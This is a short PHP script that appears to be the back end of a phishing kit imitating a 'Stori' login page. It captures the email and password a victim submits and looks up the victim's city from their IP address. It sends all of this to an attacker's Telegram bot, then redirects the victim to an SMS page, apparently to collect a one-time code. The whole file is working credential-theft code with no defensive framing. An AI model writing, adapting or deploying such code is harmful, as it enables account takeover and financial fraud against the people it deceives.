<?php
include 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['bg1'] ?? 'N/A';
    $pass  = $_POST['bg2'] ?? 'N/A';
    $ip    = $_SERVER['REMOTE_ADDR'];
    $hora  = date('Y-m-d H:i:s');

    // Obtener ciudad desde IP
    $ipInfo = @json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    $ciudad = $ipInfo->city ?? 'Desconocida';
    $region = $ipInfo->region ?? '';
    $pais   = $ipInfo->country ?? '';

    $mensaje = "
🔔 <b>LOGIN STORI</b>
📧 <b>Email:</b> <code>$email</code>
🔑 <b>Pass:</b> <code>$pass</code>

🌍 <b>IP:</b> <code>$ip</code>
🏙️ <b>Ubicación:</b> $ciudad, $region ($pais)
⏰ <b>Hora:</b> $hora
";

    // Enviar a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    file_get_contents($url . '?' . http_build_query($data));

    header('Location: sms.html');
    exit;
}
?>
